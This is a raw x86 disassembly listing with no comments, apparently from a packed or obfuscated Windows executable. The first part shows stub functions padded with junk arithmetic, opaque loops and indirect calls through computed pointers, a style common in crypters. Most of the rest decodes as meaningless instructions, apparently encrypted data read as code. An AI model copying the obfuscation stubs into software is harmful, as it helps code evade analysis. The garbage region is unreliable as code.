  411a0a:	mov    dh,0x3d
  411a0c:	mov    dl,0xb7
  411a0e:	fmul   QWORD PTR [ecx+0x16]
  411a11:	pop    ebp
  411a12:	xor    DWORD PTR [edx+ecx*8],ebp
  411a15:	retf   
  411a16:	ins    DWORD PTR es:[edi],dx
  411a17:	out    dx,eax
  411a18:	pop    ds
  411a19:	cwde   
  411a1a:	cmp    esi,edx
  411a1c:	nop
  411a1d:	test   BYTE PTR [ebx+0x5a975b8f],ch
  411a23:	(bad)  
  411a24:	xor    ecx,esi
  411a26:	add    ecx,edi
  411a28:	xor    edx,edx
  411a2a:	div    ecx
  411a2c:	mov    ecx,DWORD PTR [ebp-0x4]
  411a2f:	xor    ecx,esi
  411a31:	lea    eax,[ecx+eax*1+0x3272f6]
  411a38:	mov    ecx,DWORD PTR [ebp+0x8]
  411a3b:	mov    edx,DWORD PTR [ebp-0x20]
  411a3e:	mov    DWORD PTR [edx+ecx*4],eax
  411a41:	mov    eax,DWORD PTR [ebp-0xc]
  411a44:	mov    ecx,DWORD PTR [ebp+0x8]
  411a47:	xor    eax,esi
  411a49:	lea    eax,[eax+ecx*1+0x3272f6]
  411a50:	mov    DWORD PTR [ebp+0x8],eax
  411a53:	mov    eax,DWORD PTR [ebp-0xc]
  411a56:	mov    ecx,DWORD PTR [ebp+0x14]
  411a59:	xor    eax,esi
  411a5b:	add    eax,edi
  411a5d:	imul   eax,DWORD PTR [ecx]
  411a60:	mov    ecx,DWORD PTR [ebp-0x4]
  411a63:	mov    edx,DWORD PTR [ebp+0x8]
  411a66:	xor    ecx,esi
  411a68:	lea    ecx,[ecx+edx*1+0x3272f6]
  411a6f:	cmp    ecx,eax
  411a71:	jne    0x40f668
  411a77:	mov    eax,DWORD PTR [ebp-0x4]
  411a7a:	xor    eax,esi
  411a7c:	add    eax,edi
  411a7e:	mov    DWORD PTR [ebp-0x10],eax
  411a81:	mov    ebx,0x65655
  411a86:	add    ebx,0x3234
  411a8c:	xchg   ebx,esi
  411a8e:	xor    ebx,ebx
  411a90:	push   esi
  411a91:	mov    esi,ebx
  411a93:	pop    ebx
  411a94:	mov    edx,esi
  411a96:	add    ebx,0x1002
  411a9c:	lea    eax,[ebp-0x18]
  411a9f:	add    edx,eax
  411aa1:	add    edx,0x5
  411aa4:	push   edx
  411aa5:	inc    esi
  411aa6:	pop    ecx
  411aa7:	dec    ecx
  411aa8:	xchg   ecx,eax
  411aa9:	dec    eax
  411aaa:	xchg   ecx,eax
  411aab:	dec    ecx
  411aac:	xchg   ecx,edx
  411aae:	dec    edx
  411aaf:	push   edx
  411ab0:	mov    edx,ebx
  411ab2:	pop    ebx
  411ab3:	dec    ebx
  411ab4:	call   DWORD PTR [ebx]
  411ab6:	cmp    DWORD PTR [ebp+0x10],esi
  411ab9:	je     0x411ada
  411abf:	xchg   edx,eax
  411ac0:	push   0xc
  411ac2:	pop    ecx
  411ac3:	dec    ecx
  411ac4:	push   0x3
  411ac6:	pop    ebx
  411ac7:	inc    ebx
  411ac8:	xchg   ebx,ecx
  411aca:	inc    ecx
  411acb:	sub    ebx,ecx
  411acd:	xchg   ebx,ecx
  411acf:	dec    ecx
  411ad0:	dec    ecx
  411ad1:	mov    eax,DWORD PTR [ebp-0x1c]
  411ad4:	imul   eax,ecx
  411ad7:	add    esp,eax
  411ad9:	xchg   edx,eax
  411ada:	push   eax
  411adb:	xor    ebx,ebx
  411add:	mov    edx,esp
  411adf:	dec    edx
  411ae0:	inc    ebx
  411ae1:	add    ebx,DWORD PTR [edx+ebx*1]
  411ae4:	dec    ebx
  411ae5:	xor    edx,edx
  411ae7:	add    DWORD PTR [ebp-0x10],ebx
  411aea:	pop    ebx
  411aeb:	mov    eax,DWORD PTR [ebp-0x10]
  411aee:	pop    edi
  411aef:	pop    esi
  411af0:	pop    ebx
  411af1:	leave  
  411af2:	ret    0x10
  411af5:	push   ebp
  411af6:	mov    ebp,esp
  411af8:	push   ecx
  411af9:	mov    DWORD PTR [ebp-0x4],0xf89c85a1
  411b00:	mov    eax,DWORD PTR [ebp-0x4]
  411b03:	sbb    DWORD PTR ds:0x428ea7,ebx
  411b09:	mov    edx,DWORD PTR [ebp+0x10]
  411b0c:	mov    ecx,0x75108af
  411b11:	sbb    DWORD PTR ds:0x428eaf,0x428e4b
  411b1b:	xor    eax,ecx
  411b1d:	or     DWORD PTR ds:0x428e77,0x428e2b
  411b27:	add    eax,0x3272f6
  411b2c:	and    DWORD PTR ds:0x428e77,0x1e6e
  411b36:	mov    DWORD PTR [edx],eax
  411b38:	mov    eax,DWORD PTR [ebp+0xc]
  411b3b:	xor    eax,ecx
  411b3d:	or     DWORD PTR ds:0x428eab,0x179
  411b47:	push   esi
  411b48:	mov    esi,DWORD PTR [ebp+0x10]
  411b4b:	mov    edx,DWORD PTR ds:0x428ea7
  411b51:	sbb    DWORD PTR ds:0x428eaf,edx
  411b57:	mov    edx,0x3272f6
  411b5c:	xor    DWORD PTR ds:0x428eab,0x428e83
  411b66:	add    eax,edx
  411b68:	or     DWORD PTR ds:0x428e83,0x428e6f
  411b72:	mov    DWORD PTR [esi+0x4],eax
  411b75:	mov    eax,DWORD PTR [ebp+0x14]
  411b78:	movzx  esi,WORD PTR ds:0x428ecf
  411b7f:	sub    DWORD PTR ds:0x428e9b,esi
  411b85:	mov    esi,DWORD PTR [ebp+0x10]
  411b88:	adc    DWORD PTR ds:0x428e5b,0xf72
  411b92:	mov    DWORD PTR [esi+0x8],eax
  411b95:	mov    eax,DWORD PTR [ebp+0x18]
  411b98:	mov    esi,DWORD PTR [ebp+0x10]
  411b9b:	mov    DWORD PTR [esi+0xc],eax
  411b9e:	mov    eax,DWORD PTR [ebp+0x1c]
  411ba1:	mov    esi,DWORD PTR [ebp+0x10]
  411ba4:	mov    DWORD PTR [esi+0x10],eax
  411ba7:	mov    eax,DWORD PTR [ebp+0x8]
  411baa:	xor    eax,ecx
  411bac:	add    eax,edx
  411bae:	pop    esi
  411baf:	leave  
  411bb0:	ret    0x18
  411bb3:	push   ebp
  411bb4:	mov    ebp,esp
  411bb6:	sub    esp,0x9c
  411bbc:	sbb    ecx,0x4d1
  411bc2:	mov    ecx,DWORD PTR [ebp+0x8]
  411bc5:	mov    eax,0x8a9b
  411bca:	xor    ax,WORD PTR [ecx+0x20]
  411bce:	mov    ecx,DWORD PTR ds:0x428ea7
  411bd4:	adc    DWORD PTR ds:0x428e9f,ecx
  411bda:	mov    ecx,0x3b5d
  411bdf:	sub    DWORD PTR ds:0x428eab,0x1476
  411be9:	add    ax,cx
  411bec:	movzx  eax,ax
  411bef:	mov    DWORD PTR ds:0x428e8b,0x1b
  411bf9:	cmp    DWORD PTR ds:0x428e8b,0x0
  411c00:	je     0x411c4c
  411c06:	cmp    DWORD PTR ds:0x428e8b,0x2
  411c0d:	ja     0x411c4c
  411c13:	jmp    0x411c20
  411c18:	push   0x4
  411c1a:	call   DWORD PTR ds:0x42a9eb
  411c20:	cmp    DWORD PTR ds:0x428e8b,0x3
  411c27:	jne    0x411c3a
  411c2d:	mov    ecx,DWORD PTR ds:0x428e8b
  411c33:	dec    ecx
  411c34:	mov    DWORD PTR ds:0x428e8b,ecx
  411c3a:	mov    ecx,DWORD PTR ds:0x428e8b
  411c40:	dec    ecx
  411c41:	mov    DWORD PTR ds:0x428e8b,ecx
  411c47:	jmp    0x411bf9
  411c4c:	mov    DWORD PTR [ebp-0x10],eax
  411c4f:	mov    BYTE PTR [ebp-0x1],0x82
  411c53:	lea    eax,[ebp-0x1]
  411c56:	or     DWORD PTR ds:0x428e33,0x2387
  411c60:	mov    DWORD PTR [ebp-0xc],eax
  411c63:	xor    DWORD PTR ds:0x428e7f,edi
  411c69:	mov    al,BYTE PTR [ebp-0x1]
  411c6c:	mov    ecx,DWORD PTR [ebp-0xc]
  411c6f:	sbb    DWORD PTR ds:0x428ebf,0x63b1
  411c79:	xor    al,0x7f
  411c7b:	sbb    DWORD PTR ds:0x428e43,0x428e93
  411c85:	add    al,0x4
  411c87:	adc    DWORD PTR ds:0x428e5b,0xd9d
  411c91:	mov    BYTE PTR [ecx],al
  411c93:	and    eax,DWORD PTR ds:0x428eaf
  411c99:	mov    DWORD PTR [ebp-0x18],0xf89c85a5
  411ca0:	push   ebx
  411ca1:	mov    ecx,DWORD PTR ds:0x428e57
  411ca7:	add    DWORD PTR ds:0x428e6f,ecx
  411cad:	mov    DWORD PTR [ebp-0x8],0xf89c85a4
  411cb4:	not    eax
  411cb6:	mov    ecx,DWORD PTR [ebp-0x18]
  411cb9:	mov    DWORD PTR ds:0x428ebf,0x1e
  411cc3:	cmp    DWORD PTR ds:0x428ebf,0x0
  411cca:	je     0x4140d3
  411cd0:	cmp    DWORD PTR ds:0x428ebf,0x3
  411cd7:	jg     0x4140d3
  411cdd:	jmp    0x411cf2
  411ce2:	push   0x428e97
  411ce7:	push   0x1953
  411cec:	call   DWORD PTR ds:0x42a9ef
  411cf2:	cmp    DWORD PTR ds:0x428ebf,0x4
  411cf9:	jne    0x411d0a
  411cff:	mov    eax,ds:0x428ebf
  411d04:	dec    eax
  411d05:	mov    ds:0x428ebf,eax
  411d0a:	mov    eax,ds:0x428ebf
  411d0f:	dec    eax
  411d10:	mov    ds:0x428ebf,eax
  411d15:	jmp    0x411cc3
  411d1a:	jmp    0x4140d3
  411d1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d20:	test   al,0xbe
  411d22:	cdq    
  411d23:	mov    esp,0x1c848485
  411d28:	pcmpgtw mm0,QWORD PTR [eax+0x4e7ea56c]
  411d2f:	xor    DWORD PTR [ebx+0x60e78383],ecx
  411d35:	add    DWORD PTR [ebx+0x3b0b7237],0xffffffd5
  411d3c:	cmp    bh,BYTE PTR [eax]
  411d3e:	leave  
  411d3f:	add    esp,esi
  411d41:	gs xchg edx,eax
  411d43:	fadd   st,st(3)
  411d45:	and    eax,0x818cde5a
  411d4a:	sbb    eax,0xc72687f
  411d4f:	mov    ebp,0x4798d05b
  411d54:	sbb    al,BYTE PTR [esi-0xda33875]
  411d5a:	mov    esi,esp
  411d5c:	(bad)  
  411d5d:	out    dx,al
  411d5e:	jmp    0x96f6:0xc4b34d07
  411d65:	sub    BYTE PTR es:[edx-0x79b67676],0x8a
  411d6d:	mov    bh,0x7e
  411d6f:	loope  0x411d14
  411d71:	push   ebp
  411d72:	sub    DWORD PTR [ebx-0xfe88947],edx
  411d78:	add    al,0x33
  411d7a:	aaa    
  411d7b:	mov    bh,0xe2
  411d7d:	xor    eax,0xaf4989c
  411d82:	(bad)  
  411d83:	rcl    al,0xcd
  411d86:	jmp    0x411d1c
  411d88:	push   ds
  411d89:	mov    cl,0xf2
  411d8b:	nop
  411d8c:	fist   DWORD PTR [edi+0xec34f1a]
  411d92:	jne    0x411dba
  411d94:	nop
  411d95:	mov    bl,0xa
  411d97:	jmp    0x79d:0x6b913721
  411d9e:	loopne 0x411d93
  411da0:	sbb    BYTE PTR [eax],dl
  411da2:	mov    al,ds:0x829b1e70
  411da7:	and    eax,0xd0665360
  411dac:	popa   
  411dad:	xor    edx,0x829cf422
  411db3:	ins    DWORD PTR es:[edi],dx
  411db4:	fistp  DWORD PTR [ebp+0xe]
  411db7:	or     eax,0xd0f18ecd
  411dbc:	mov    al,ds:0x953e21e1
  411dc1:	ret    0xf017
  411dc4:	loope  0x411d5c
  411dc6:	stos   BYTE PTR es:[edi],al
  411dc7:	leave  
  411dc8:	mov    ecx,ebx
  411dca:	gs jle 0x411dd3
  411dcd:	aas    
  411dce:	jne    0x411e13
  411dd0:	sub    al,BYTE PTR fs:[esi+0x15ba364c]
  411dd7:	popa   
  411dd8:	inc    esi
  411dd9:	cmp    BYTE PTR [edx+edi*1],0x74
  411ddd:	fbld   TBYTE PTR [edx]
  411ddf:	or     eax,0xb216acb3
  411de4:	jne    0x411e5d
  411de6:	and    bl,BYTE PTR [ebx]
  411de8:	gs add cl,dh
  411deb:	and    cl,BYTE PTR [edi]
  411ded:	pop    ebx
  411dee:	popf   
  411def:	daa    
  411df0:	scas   al,BYTE PTR es:[edi]
  411df1:	adc    dl,BYTE PTR [edi-0x21]
  411df4:	in     eax,0xc6
  411df6:	sub    DWORD PTR [ebp+0x22],edx
  411df9:	sub    al,BYTE PTR [edi+0x3c22db24]
  411dff:	jb     0x411db1
  411e01:	jo     0x411e64
  411e03:	or     DWORD PTR [edi],ecx
  411e05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e06:	mov    eax,0x53d4f87e
  411e0b:	mov    bh,0xd
  411e0d:	ds and eax,0xfb43dea6
  411e13:	fisub  WORD PTR [ebx-0x51a412fd]
  411e19:	adc    DWORD PTR [ebp+0x654f47e2],0x6ef4a95c
  411e23:	xor    eax,0x5ac53513
  411e28:	dec    ecx
  411e29:	dec    edi
  411e2a:	mov    DWORD PTR [edx+ecx*2+0x34],esp
  411e2e:	xor    al,0x29
  411e30:	mov    edx,0x39e6e0e6
  411e35:	pop    ebx
  411e36:	imul   ecx,DWORD PTR [edi+esi*8-0x6b],0x45ccf838
  411e3e:	push   edi
  411e3f:	pusha  
  411e40:	mov    bh,BYTE PTR [esi]
  411e42:	mov    edx,0xd5872b5f
  411e47:	test   eax,0xca85f94a
  411e4c:	dec    eax
  411e4d:	lock in al,0x8c
  411e50:	lahf   
  411e51:	cmp    al,BYTE PTR [ecx+0x636a4f40]
  411e57:	sub    dl,ch
  411e59:	xlat   BYTE PTR ds:[ebx]
  411e5a:	std    
  411e5b:	mov    dl,0x15
  411e5d:	daa    
  411e5e:	xor    DWORD PTR [esi-0x57],0xd82664aa
  411e65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e66:	mov    ah,0x14
  411e68:	inc    esp
  411e69:	lds    esi,FWORD PTR [ebp+edi*8+0x59]
  411e6d:	jb     0x411e6f
  411e6f:	fldenv [ebx+ecx*2+0x37]
  411e73:	mov    WORD PTR [edx+0x10],?
  411e76:	je     0x411e0e
  411e78:	mov    ch,0x87
  411e7a:	into   
  411e7b:	mov    esi,0x815873a2
  411e80:	jae    0x411e74
  411e82:	push   es
  411e83:	popf   
  411e84:	fucom  st(3)
  411e86:	fild   QWORD PTR [ebx-0x3a]
  411e89:	or     eax,0x31976b10
  411e8e:	(bad)  
  411e8f:	jmp    0x411ec4
  411e91:	sub    al,0x1d
  411e93:	inc    ebp
  411e94:	ret    
  411e95:	inc    ebp
  411e96:	ja     0x411e9a
  411e98:	rcl    BYTE PTR [edx+0x67],1
  411e9b:	jo     0x411eca
  411e9d:	outs   dx,BYTE PTR ds:[esi]
  411e9e:	in     al,dx
  411e9f:	cmc    
  411ea0:	xor    DWORD PTR [ecx],esi
  411ea2:	pusha  
  411ea3:	rcl    DWORD PTR [ebp+0x1af16141],1
  411ea9:	add    ecx,DWORD PTR [edi-0xc]
  411eac:	mov    dh,0x99
  411eae:	jl     0x411ee4
  411eb0:	pop    eax
  411eb1:	dec    esp
  411eb2:	int    0xff
  411eb4:	cdq    
  411eb5:	into   
  411eb6:	out    dx,eax
  411eb7:	cmp    DWORD PTR [ebx+0x770dd9e4],eax
  411ebd:	inc    ebp
  411ebe:	lea    ebx,[edx]
  411ec0:	and    eax,0x901e334b
  411ec5:	fisttp QWORD PTR [edi+0x41]
  411ec8:	mov    ds:0xbd1b1a0e,al
  411ecd:	sysenter 
  411ecf:	sbb    esp,DWORD PTR [esi-0x5]
  411ed2:	cmp    al,cl
  411ed4:	and    DWORD PTR [ebx-0x2f],edi
  411ed7:	cdq    
  411ed8:	xlat   BYTE PTR es:[ebx]
  411eda:	xchg   DWORD PTR [esi+0x48c5873d],edi
  411ee0:	add    eax,0xc09361c8
  411ee5:	jmp    0x70a01566
  411eea:	jb     0x411f57
  411eec:	dec    ebx
  411eed:	push   es
  411eee:	push   ds
  411eef:	test   al,0x8e
  411ef2:	sub    al,0xea
  411ef4:	sar    DWORD PTR [ebx-0x43],0x9b
  411ef8:	pop    es
  411ef9:	(bad)  
  411efb:	test   eax,0xcf940342
  411f00:	sbb    ebp,DWORD PTR [ecx+eax*1+0x37e7bedd]
  411f07:	leave  
  411f08:	add    bl,dh
  411f0a:	aam    0x27
  411f0c:	jg     0x411e8e
  411f0e:	fsubr  st(0),st
  411f10:	cmp    al,0x5
  411f12:	or     DWORD PTR [edx+eax*8+0x1a],0x58
  411f17:	mov    ecx,0xd104d6c1
  411f1c:	(bad)  
  411f1d:	fidivr DWORD PTR [edx-0x78fc3416]
  411f23:	aam    0x1a
  411f25:	cmp    ah,ah
  411f27:	pop    esi
  411f28:	iret   
  411f29:	and    al,0x28
  411f2b:	sbb    dh,BYTE PTR [ecx-0xa4b4e97]
  411f31:	pop    ebp
  411f32:	jle    0x411ede
  411f34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f35:	adc    BYTE PTR [edx+0x9],al
  411f38:	push   edx
  411f39:	int    0x2e
  411f3b:	lods   eax,DWORD PTR ds:[esi]
  411f3c:	daa    
  411f3d:	jg     0x411edb
  411f3f:	and    dl,BYTE PTR [esi]
  411f41:	cmp    BYTE PTR [eax-0x16197938],ch
  411f47:	call   0x9b836f5c
  411f4c:	jne    0x411fc8
  411f4e:	test   BYTE PTR [ebx],al
  411f50:	(bad)  
  411f51:	xchg   esp,eax
  411f52:	jg     0x411f84
  411f54:	aam    0x1f
  411f56:	xor    DWORD PTR [esi+0x5a],esp
  411f59:	leave  
  411f5a:	and    eax,0x9caa167e
  411f5f:	xor    dx,WORD PTR [ebx-0x1b237bfe]
  411f66:	pop    edi
  411f67:	mov    bh,0x92
  411f69:	outs   dx,BYTE PTR ds:[esi]
  411f6a:	data16 xchg BYTE PTR [esi],ah
  411f6d:	jb     0x411fb5
  411f6f:	daa    
  411f70:	sbb    ebp,DWORD PTR [ebx-0x1920c21a]
  411f76:	out    dx,eax
  411f77:	xchg   esp,eax
  411f78:	xchg   esp,eax
  411f79:	pop    ecx
  411f7a:	test   DWORD PTR [ecx+0x78993034],0x2f138d7c
  411f84:	mov    esi,0x22db4dd6
  411f89:	pusha  
  411f8a:	sub    esp,DWORD PTR [edi]
  411f8c:	fbstp  TBYTE PTR [edi-0x3373ae53]
  411f92:	push   ecx
  411f93:	push   es
  411f94:	fsubp  st(5),st
  411f96:	ror    DWORD PTR [ecx+0x2f],1
  411f99:	ret    
  411f9a:	mov    ds:0x470dfeff,al
  411f9f:	fistp  WORD PTR [ebx+0x6625b1e7]
  411fa5:	xor    DWORD PTR [eax-0x32b168d0],esp
  411fab:	mul    DWORD PTR [edi]
  411fad:	push   ebp
  411fae:	in     al,dx
  411faf:	pop    edi
  411fb0:	push   esp
  411fb1:	aad    0x54
  411fb3:	dec    ebx
  411fb4:	jge    0x411ff4
  411fb6:	ins    DWORD PTR es:[edi],dx
  411fb7:	(bad)  
  411fb8:	pop    ebx
  411fb9:	arpl   WORD PTR [ebx+0x1a],bp
  411fbc:	jo     0x41200f
  411fbe:	outs   dx,BYTE PTR ds:[esi]
  411fbf:	cmp    DWORD PTR [edx+0x2e],ebx
  411fc2:	mov    ds:0xe10b8921,al
  411fc7:	xor    BYTE PTR [edi],ah
  411fc9:	mov    ecx,edx
  411fcb:	bound  eax,QWORD PTR [ebx+0x56f2b659]
  411fd1:	mov    ebp,0x8ff00cb7
  411fd6:	out    dx,eax
  411fd7:	out    dx,eax
  411fd8:	(bad)  
  411fd9:	imul   edx,DWORD PTR [ebx+eax*4-0x30],0x2d
  411fde:	jne    0x411fa2
  411fe0:	je     0x411fbe
  411fe2:	push   edi
  411fe3:	sbb    bh,BYTE PTR [esi+edx*8+0x661c7fb6]
  411fea:	and    al,0x6c
  411fec:	sub    esp,DWORD PTR [edx]
  411fee:	(bad)  
  411fef:	in     al,dx
  411ff0:	pop    edi
  411ff1:	dec    esp
  411ff2:	retf   
  411ff3:	scas   eax,DWORD PTR es:[edi]
  411ff4:	xor    eax,0x808695e0
  411ff9:	aaa    
  411ffa:	or     DWORD PTR [esi-0x2e],ebx
  411ffd:	repnz push ebp
  411fff:	mov    BYTE PTR [ecx],bl
  412001:	out    dx,al
  412002:	out    dx,eax
  412003:	lods   al,BYTE PTR ds:[esi]
  412004:	xor    al,0x88
  412006:	das    
  412007:	lea    edx,[edi]
  412009:	mov    esi,0xa444ec28
  41200e:	ret    0xbea7
  412011:	das    
  412012:	out    dx,al
  412013:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  412015:	in     al,0xe1
  412017:	and    al,0xa6
  412019:	mov    ebx,0xa0236ede
  41201e:	ret    0x7bee
  412021:	sub    al,0x4a
  412023:	mov    esi,?
  412025:	xor    eax,0xafe490d
  41202a:	add    DWORD PTR [edi],ecx
  41202c:	stos   BYTE PTR es:[edi],al
  41202d:	push   0x65
  41202f:	arpl   dx,di
  412031:	xchg   ebx,eax
  412032:	add    esp,esi
  412034:	inc    ebx
  412035:	adc    eax,0x6e8ebca
  41203a:	stc    
  41203b:	push   edx
  41203c:	into   
  41203d:	adc    ecx,eax
  41203f:	push   ecx
  412040:	nop
  412041:	fldcw  WORD PTR [edi-0x71eab1b9]
  412047:	pop    eax
  412048:	ins    BYTE PTR es:[edi],dx
  412049:	or     DWORD PTR [ebp+0x55],edi
  41204c:	shl    BYTE PTR [ebx-0x66],0xc1
  412050:	sub    al,0xc3
  412052:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412053:	cmp    DWORD PTR [ebx+0x38403a45],0x3e796b35
  41205d:	stos   BYTE PTR es:[edi],al
  41205e:	sbb    al,0xed
  412060:	stos   DWORD PTR es:[edi],eax
  412061:	sbb    edx,DWORD PTR [edx]
  412063:	shr    DWORD PTR [esp+ebp*1+0x18],cl
  412067:	xchg   ebx,eax
  412068:	(bad)  [esi]
  41206a:	cmp    eax,0x2f15e73b
  41206f:	sahf   
  412070:	loopne 0x4120e4
  412072:	xor    ebp,DWORD PTR [eax-0x4824d65]
  412078:	mov    ecx,0x60c557b5
  41207d:	in     eax,dx
  41207e:	ret    0xfaf5
  412081:	leave  
  412082:	mov    ch,dl
  412084:	mov    ecx,0xab002846
  412089:	neg    DWORD PTR [edx]
  41208b:	push   esp
  41208c:	xchg   dh,cl
  41208e:	jecxz  0x412076
  412090:	push   0xffffffea
  412092:	push   esp
  412093:	sub    ch,BYTE PTR [edx]
  412095:	mov    BYTE PTR [ebx+0x78b9ba13],bh
  41209b:	or     BYTE PTR [ebp*8+0x24108440],ch
  4120a2:	call   0x24289b75
  4120a7:	jb     0x412092
  4120a9:	stos   BYTE PTR es:[edi],al
  4120aa:	cmp    esp,DWORD PTR [edx]
  4120ac:	pop    ss
  4120ad:	inc    esp
  4120ae:	test   eax,0x944891ea
  4120b3:	add    DWORD PTR [esi],eax
  4120b5:	push   ebx
  4120b6:	lahf   
  4120b7:	mov    ecx,cs
  4120b9:	stc    
  4120ba:	pop    esi
  4120bb:	stos   DWORD PTR es:[edi],eax
  4120bc:	adc    ch,bl
  4120be:	popf   
  4120bf:	pop    ss
  4120c0:	rcl    DWORD PTR [edx+0x237fd57a],1
  4120c6:	mov    ds:0x32142f7c,al
  4120cb:	inc    ebx
  4120cc:	push   cs
  4120cd:	mov    ecx,0xc5b9be9d
  4120d2:	lea    ebx,[edi]
  4120d4:	scas   eax,DWORD PTR es:[edi]
  4120d5:	shl    BYTE PTR [esp+edi*8-0x2156d593],cl
  4120dc:	cwde   
  4120dd:	js     0x4120cf
  4120df:	dec    ecx
  4120e0:	pop    esp
  4120e1:	inc    edi
  4120e2:	ret    
  4120e3:	mov    eax,0xea586b3
  4120e8:	ror    DWORD PTR [edx-0x49],1
  4120eb:	sbb    ah,al
  4120ed:	loopne 0x412136
  4120ef:	fsubr  st(2),st
  4120f1:	inc    ecx
  4120f2:	scas   al,BYTE PTR es:[edi]
  4120f3:	lods   eax,DWORD PTR ds:[esi]
  4120f4:	loop   0x4120eb
  4120f6:	or     BYTE PTR [edx+0x1c2009a3],bl
  4120fc:	xor    ch,BYTE PTR [edx-0x556a0bb1]
  412102:	rol    DWORD PTR [ebx+0x125426e5],0xcb
  412109:	jmp    0x4dd7:0x9e6f5854
  412110:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412111:	jge    0x412156
  412113:	repz imul edx,DWORD PTR [ebx-0x54],0xbd8bee07
  41211b:	inc    edi
  41211c:	sbb    ah,BYTE PTR [esp+edx*8]
  41211f:	imul   esp,DWORD PTR [edx+edi*2],0xefbc26c8
  412126:	inc    esp
  412127:	push   0x722d0e16
  41212c:	cmp    ebx,DWORD PTR [edi+ebp*8-0x60]
  412130:	dec    edx
  412131:	inc    ecx
  412132:	aaa    
  412133:	mov    ds:0xba0d74f2,al
  412138:	in     eax,0xdd
  41213a:	and    ebx,DWORD PTR [ebp+ebx*1-0x20]
  41213e:	fwait
  41213f:	(bad)  
  412140:	imul   edx,DWORD PTR [eax],0xffffffbd
  412143:	std    
  412144:	adc    al,0x16
  412146:	inc    ebx
  412147:	aam    0xc5
  412149:	mov    bh,0x2d
  41214b:	mov    esp,0x6885814e
  412150:	test   BYTE PTR [ecx],dl
  412152:	xchg   esp,eax
  412153:	dec    ebp
  412154:	add    al,0xb8
  412156:	sub    edx,DWORD PTR ds:0xc06d8c61
  41215c:	test   DWORD PTR [eax],esi
  41215e:	shr    ah,0x29
  412161:	je     0x412177
  412163:	jo     0x4121e2
  412165:	jbe    0x4121ca
  412167:	mov    WORD PTR [ebx-0xd3fcced],gs
  41216d:	rcl    DWORD PTR [ebp-0x3b346099],cl
  412173:	or     DWORD PTR [edi],edx
  412175:	sub    DWORD PTR [edi+0x188c5a96],edi
  41217b:	ret    0x549e
  41217e:	pusha  
  41217f:	mov    al,ds:0x2cefe3fc
  412184:	xlat   BYTE PTR ds:[ebx]
  412185:	mov    esi,0xb541bdcc
  41218a:	inc    eax
  41218b:	arpl   WORD PTR [edx-0x6d],ax
  41218e:	or     al,0xea
  412190:	adc    esi,edi
  412192:	jbe    0x412202
  412194:	(bad)  [esi-0x6a]
  412197:	sub    al,0xaa
  412199:	call   0xd4deadc3
  41219e:	dec    ebx
  41219f:	rcl    DWORD PTR [ebp+0x4d316b73],1
  4121a5:	jmp    0x895fab5c
  4121aa:	mov    esi,cs
  4121ac:	push   esi
  4121ad:	adc    esi,DWORD PTR [eax+0x7839f061]
  4121b3:	adc    BYTE PTR [ebp+0x46],dh
  4121b6:	dec    eax
  4121b7:	out    0x99,eax
  4121b9:	mov    bh,0x54
  4121bb:	cmp    esi,esi
  4121bd:	popa   
  4121be:	loope  0x412144
  4121c0:	addps  xmm4,XMMWORD PTR [esi-0x45]
  4121c4:	mov    edx,0x580840f8
  4121c9:	and    al,0x99
  4121cb:	mov    eax,ds:0x7bd48081
  4121d0:	cwde   
  4121d1:	xchg   esi,eax
  4121d2:	mov    esi,DWORD PTR [ebp+0x1ba69388]
  4121d8:	jmp    0xaee9:0x28741393
  4121df:	pushf  
  4121e0:	pop    edi
  4121e1:	js     0x412194
  4121e3:	cmp    DWORD PTR [eax],ebp
  4121e5:	mov    ah,0xf2
  4121e7:	lea    ebx,[esi]
  4121e9:	and    esp,esp
  4121eb:	jnp    0x412187
  4121ed:	outs   dx,BYTE PTR ds:[esi]
  4121ee:	es dec edi
  4121f0:	pushf  
  4121f1:	imul   edi,DWORD PTR [edx-0x76],0x38f02260
  4121f8:	iret   
  4121f9:	mov    ebp,DWORD PTR [ebx-0x67932767]
  4121ff:	mov    ecx,0x70c3c4ec
  412204:	fnstenv [edi]
  412206:	ja     0x412282
  412208:	xor    BYTE PTR [ecx+0x30],dh
  41220b:	int    0x32
  41220d:	fnstcw WORD PTR [edi+0x68]
  412210:	mov    al,ds:0xbff460d7
  412215:	and    ebx,edx
  412217:	pop    ss
  412218:	les    ebx,FWORD PTR [esi-0x1a0b7db7]
  41221e:	xchg   ebp,eax
  41221f:	les    edi,FWORD PTR [ebx]
  412221:	mov    ebx,0x2ddf81eb
  412226:	jl     0x4121e6
  412228:	fldpi  
  41222a:	vcvtss2sd xmm5,xmm6,xmm0
  41222e:	push   ss
  41222f:	cwde   
  412230:	not    DWORD PTR [ebp+0x1746fb50]
  412236:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412237:	jbe    0x41227d
  412239:	cmp    eax,0x2608c5db
  41223e:	nop
  41223f:	sar    DWORD PTR [eax],1
  412241:	rcl    DWORD PTR [ecx+ebx*2],0xc0
  412245:	lods   eax,DWORD PTR ds:[esi]
  412246:	add    eax,0xc66021d7
  41224b:	and    al,0xf
  41224d:	mov    ebx,0xd16d3e5f
  412252:	mov    al,0x7a
  412254:	sub    DWORD PTR [ebp-0x55],ebp
  412257:	call   0xce66b27c
  41225c:	push   esp
  41225d:	daa    
  41225e:	lds    ebp,FWORD PTR [esi]
  412260:	mov    WORD PTR [edx+0x45c14eba],ds
  412266:	add    al,0x6b
  412268:	cwde   
  412269:	sub    dl,BYTE PTR [edi+0x219b3dc7]
  41226f:	adc    DWORD PTR [eax-0x4a1d21ef],ebx
  412275:	add    al,0xf
  412277:	repnz xchg ebp,eax
  412279:	cmp    edi,DWORD PTR [esi-0x13]
  41227c:	int    0xda
  41227e:	sbb    eax,0xa32c0e0a
  412283:	cdq    
  412284:	pop    ds
  412285:	xor    esi,ebx
  412287:	push   edx
  412288:	or     BYTE PTR [ebx-0x6cdf754d],bh
  41228e:	outs   dx,DWORD PTR ds:[esi]
  41228f:	pop    esp
  412290:	test   BYTE PTR [ebx],cl
  412292:	dec    ebx
  412293:	push   ecx
  412294:	mov    dh,dl
  412296:	pop    esi
  412297:	push   0x414fb42b
  41229c:	sub    edx,0xffffffd4
  41229f:	mov    edx,edx
  4122a1:	and    DWORD PTR [eax+0xd],edx
